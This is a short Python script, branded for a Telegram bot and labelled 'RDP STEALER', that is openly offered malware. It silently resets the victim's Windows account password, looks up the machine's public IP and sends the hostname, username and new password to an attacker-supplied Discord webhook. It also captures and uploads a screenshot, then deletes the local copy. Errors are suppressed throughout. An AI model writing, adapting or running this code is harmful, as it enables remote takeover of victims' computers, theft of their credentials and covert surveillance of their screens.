###############################################################################################
###                           TELEGRAM @Techturfbot                                         ###
###############################################################################################

from dhooks import Webhook,File
import requests,getpass
import os,socket
from PIL import ImageGrab

hook=Webhook('//place your webhook url here')

###############################################################################################
###                                     RDP STEALER                                         ###
###############################################################################################

try:
    hostname=socket.gethostname()
    get_ip=requests.get('https://api.ipify.org').text
    New_Password="@Techturfbot"
    os.system(f'net user %username% {New_Password}')
    hook.send(f'\nnew RDP \nHOSTNAME> {hostname}\nIP> {get_ip}\nUsername> {getpass.getuser()}\nPASSWORD> {New_Password}\nLove from Skiddie <3')
except:
    pass
try:
    screen=ImageGrab.grab()
    screen.save("C:\\User\\"+getpass.getuser()+"\\AppData\\Roaming\\screen.jpg")
    file3=File(f"C:\\User\\"+getpass.getuser()+"\\AppData\\Roaming\\screen.jpg",name='screen.jpg')
    hook.send('ScreenShot:',file=file3)
except:
    pass

try:
    os.remove(f"C:\\User\\"+getpass.getuser()+"\\AppData\\Roaming\\screen.jpg")
except:
    pass
